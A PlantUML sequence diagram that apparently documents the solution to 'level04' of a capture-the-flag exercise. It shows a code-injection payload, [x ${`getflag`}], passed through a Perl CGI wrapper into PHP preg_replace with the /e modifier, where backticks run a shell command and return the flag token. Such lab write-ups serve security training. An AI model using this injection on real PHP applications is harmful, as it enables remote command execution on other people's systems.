@startuml level04_exploit
title Level04 - PHP /e Modifier Code Injection

actor Attacker
participant "Perl CGI" as CGI
participant "level04 Binary" as Binary
participant "PHP preg_replace" as PHP
participant "flag04" as Flag04

Attacker -> CGI: Send payload: [x ${`getflag`}]
CGI -> Binary: Execute with Perl backticks

Binary -> PHP: preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", input)
note right of PHP
  /e modifier evaluates replacement
  Backticks execute shell commands
  Replacement: y("${`getflag`}")
end note

PHP -> PHP: Evaluate ${`getflag`}
PHP -> Flag04: Execute getflag
Flag04 --> PHP: ne2searoevaevoem4ov4ar8ap
PHP --> CGI: Return result with token
CGI --> Attacker: ne2searoevaevoem4ov4ar8ap

@enduml
